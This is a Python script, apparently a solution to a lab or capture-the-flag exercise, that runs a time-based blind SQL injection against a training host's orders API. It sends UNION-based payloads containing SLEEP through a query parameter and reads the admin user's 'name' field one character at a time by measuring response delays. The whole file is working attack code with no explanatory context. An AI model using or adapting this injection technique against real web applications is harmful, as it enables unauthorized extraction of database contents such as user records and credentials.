#!/usr/bin/env python3
import requests
import string
import time

url = "http://web0x01.hbtn/api/a3/sql_injection/all_orders"
chars = string.digits + string.ascii_lowercase + "{}_!@#$%^&*()-=+"

# 1. name sütunundaki dəyərin uzunluğunu tap (username='admin' olan)
print("[*] Finding length of 'name' column for admin user...")
for length in range(1, 65):
    payload = f"no' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM users WHERE username='admin' AND LENGTH(name)={length} AND SLEEP(4);--"
    start = time.time()
    try:
        r = requests.get(url, params={"status": payload}, timeout=10)
    except:
        pass
    elapsed = time.time() - start
    if elapsed > 3:
        print(f"[+] Name length = {length}")
        break

# 2. Hər simvolu çıxart
flag = ""
print(f"\n[*] Extracting name value (flag)...")
for i in range(1, length + 1):
    found = False
    for c in chars:
        payload = f"no' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM users WHERE username='admin' AND MID(name,{i},1)='{c}' AND SLEEP(4);--"
        start = time.time()
        try:
            r = requests.get(url, params={"status": payload}, timeout=10)
        except:
            pass
        elapsed = time.time() - start
        if elapsed > 3:
            flag += c
            print(f"[+] Pos {i}: '{c}' -> Flag: {flag}")
            found = True
            break
    
    if not found:
        # Uppercase dene
        for c in string.ascii_uppercase:
            payload = f"no' UNION SELECT NULL,NULL,NULL,NULL,NULL FROM users WHERE username='admin' AND MID(name,{i},1)='{c}' AND SLEEP(4);--"
            start = time.time()
            try:
                r = requests.get(url, params={"status": payload}, timeout=10)
            except:
                pass
            elapsed = time.time() - start
            if elapsed > 3:
                flag += c
                print(f"[+] Pos {i}: '{c}' -> Flag: {flag}")
                found = True
                break
    
    if not found:
        print(f"[-] Could not find char at position {i}")
        print(f"[*] Flag so far: {flag}")
        break

print(f"\n[✅] FINAL FLAG: {flag}")
